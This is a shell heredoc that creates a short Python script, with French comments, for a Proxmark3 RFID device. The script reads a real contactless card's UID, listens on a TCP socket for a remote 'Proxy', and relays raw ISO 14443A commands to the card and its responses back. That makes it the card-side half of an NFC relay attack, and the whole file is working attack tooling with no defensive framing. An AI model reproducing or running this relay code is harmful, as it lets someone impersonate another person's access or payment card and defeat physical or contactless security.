cat << 'EOF' > mole.py
import subprocess
import socket
import re


#Code a copier coller dans proxmark3 -

# --- CONFIGURATION ---
PM3_PATH = "./client/proxmark3.exe"
PORT_PM3 = "COM9" 
HOST = '127.0.0.1' 
PORT_NET = 5555

def pm3_exec(cmd):
    return subprocess.run([PM3_PATH, PORT_PM3, "-c", cmd], capture_output=True, text=True).stdout

def get_real_uid():
    print("[*] Lecture de l'UID réel...")
    out = pm3_exec("hf mfu info")
    match = re.search(r'UID\s*:\s*([0-9A-Fa-f ]+)', out)
    return match.group(1).replace(" ", "").strip() if match else None
#peut etre récup + vite autrement

def start_mole():
    uid = get_real_uid()
    if not uid: return print("[!] Carte non détectée.")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT_NET))
        s.listen(1)
        print(f"[*] Mole prête (UID: {uid}). En attente du Proxy...")
        conn, addr = s.accept()
        with conn:
            conn.sendall(uid.encode())
            while True:
                cmd_hex = conn.recv(1024).decode()
                if not cmd_hex: break
                
                print(f"[>] Relais vers carte: {cmd_hex}")
                # Envoi raw avec calcul du CRC (-c)
                res = pm3_exec(f"hf 14a raw -c {cmd_hex}")
                
                # On cherche la ligne de réponse après 'received:'
                response = "00"
                for line in res.split('\n'):
                    if "received" in line.lower():
                        response = line.split(":")[-1].strip().replace(" ", "")
                        break
                conn.sendall(response.encode())

if __name__ == "__main__":
    start_mole()
EOF